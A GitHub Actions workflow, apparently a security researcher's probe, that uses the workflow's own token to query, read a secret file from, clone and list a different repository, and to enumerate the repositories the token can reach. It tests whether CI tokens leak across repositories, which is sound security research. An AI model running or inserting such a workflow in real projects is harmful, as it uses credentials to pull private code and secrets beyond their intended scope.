name: crossrepo-token-probe2
on: [push, workflow_dispatch]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env: {GH_TOK: "${{ github.token }}"}
        run: |
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GH_TOK" https://api.github.com/repos/s3rdz0x1337/codespace-target-1789121382)
          echo "repo-meta HTTP=$code"
          codec=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GH_TOK" https://api.github.com/repos/s3rdz0x1337/codespace-target-1789121382/contents/CODESPACE-SECRET.txt)
          echo "contents HTTP=$codec"
          if git clone --depth 1 https://x-access-token:$GH_TOK@github.com/s3rdz0x1337/codespace-target-1789121382 /tmp/clone 2>/tmp/e; then echo CLONE=SUCCESS; ls /tmp/clone; else echo CLONE=FAIL; head -c 150 /tmp/e; fi
          echo "token-repos:"; curl -s -H "Authorization: token $GH_TOK" https://api.github.com/installation/repositories 2>/dev/null | head -c 120
